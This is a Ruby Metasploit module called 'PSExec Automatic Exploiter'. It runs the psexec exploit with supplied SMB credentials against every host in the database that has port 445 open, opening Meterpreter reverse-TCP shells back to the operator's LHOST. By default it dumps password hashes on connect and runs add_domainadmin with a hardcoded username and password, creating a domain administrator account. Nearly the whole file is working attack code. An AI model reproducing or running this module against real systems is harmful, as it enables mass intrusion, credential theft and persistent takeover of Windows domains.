# This module takes over Windows hosts using the psexec exploit using the data of the db.
# Runs Meterpreter by default using hashdump as the InitialAutoRunScript
# Uses the add_domainadmin Meterpreter script by default
#
# Version 0.1 - 2010.12.28 19:49

require 'msf/core'

class Metasploit3 < Msf::Auxiliary


	def initialize(info = {})
                super(update_info(info,
                        'Name'        => 'PSExec Automatic Exploiter',
                        'Version'     => '1',
                        'Description' => %q{
                                        This module takes over Windows hosts using the psexec exploit using the data of the db.
					Runs Meterpreter by default using hashdump as the InitialAutoRunScript
					Uses the add_domainadmin Meterpreter script by default
                        },
                        'Author'      =>
                                [
                                        # initial concept by Z
                                        'vpb',
                                ],
                        'License'     => BSD_LICENSE,
                        'Actions'     =>
                                [
                                        [ 'Default Action', {
                                                'Description' => 'Default module action'
                                        } ],
                                ],
			'DefaultAction' => 'Default Action'
                        ))

                register_options([
                        OptAddress.new('LHOST', [true,
                                'The IP address to use for reverse-connect payloads'
                        ]),
			OptString.new('SMBUser',[true,'SMB User']),
			OptString.new('SMBPass',[true,'SMB Password hashes']),
			OptString.new('SMBDomain',[true,'SMB Domain','WORKGROUP']),
			OptString.new('AutoRunScript',[false,'AutoRunScript for Meterpreter','add_domainadmin -u geza -p Trustno1'])
                ], self.class)
	end	

	def run

		print_status("Starting the payload handler")
		multihandler=framework.modules.create('exploit/multi/handler')
		multihandler.datastore['LHOST']=(datastore['LHOST'] || "0.0.0.0")
		multihandler.datastore['InitialAutorunScript']='hashdump'
		multihandler.datastore['AutoRunScript']=datastore['AutoRunScript']
		multihandler.exploit_simple(
			'LocalInput'     => self.user_input,
                        'LocalOutput'    => self.user_output,
                        'Target'         => 0,
                        'Payload'        => 'windows/meterpreter/reverse_tcp',
                        'RunAsJob'       => true
		)

		services=framework.db.services(framework.db.default_workspace,false,nil,nil,445) 
		services.each do |s|
			print_status("Trying #{s.host.address}")
			psexec=framework.modules.create('exploit/windows/smb/psexec')
			psexec.datastore['RHOST']=s.host.address
			psexec.datastore['SMBUser']=datastore['SMBUser']
			psexec.datastore['SMBPass']=datastore['SMBPass']
			psexec.datastore['SMBDomain']=datastore['SMBDomain']
			psexec.datastore['LHOST']=datastore['LHOST']
			psexec.datastore['PAYLOAD']='windows/meterpreter/reverse_tcp'
			psexec.datastore['DisablePayloadHandler'] = true
		
			psexec.exploit_simple(
                	        'LocalInput'     => self.user_input,
                        	'LocalOutput'    => self.user_output,
                        	'Target'         => 0,
                        	'Payload'        => 'windows/meterpreter/reverse_tcp',
                        	'RunAsJob'       => true
			)
			
		end

	end

	def cleanup
		super
	end
end
